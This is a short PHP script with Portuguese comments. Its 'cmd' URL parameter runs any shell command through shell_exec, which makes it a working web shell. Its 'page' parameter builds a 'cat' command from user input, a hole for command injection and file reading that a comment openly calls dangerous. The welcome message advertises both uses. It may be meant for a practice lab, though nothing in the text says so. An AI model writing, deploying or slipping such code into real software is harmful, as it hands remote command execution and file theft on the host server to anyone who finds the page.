<?php
// Executar comando com cmd=
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    echo "<h2>Executando comando:</h2>";
    echo "<pre>";
    echo shell_exec($command);
    echo "</pre>";
    exit; // Finaliza para evitar interferência com o parâmetro "page="
}

// Abrir página com page=
if (isset($_GET['page'])) {
    $file = $_GET['page'];

    // Comando perigoso (vulnerável a injeção)
    echo "<h2>Carregando página:</h2>";
    echo "<pre>";
    echo shell_exec("cat " . $file);
    echo "</pre>";
    exit;
}

// Mensagem padrão
echo "<h2>Bem-vindo!</h2>";
echo "<p>Use <code>?cmd=</code> para executar comandos ou <code>?page=</code> para acessar arquivos.</p>";
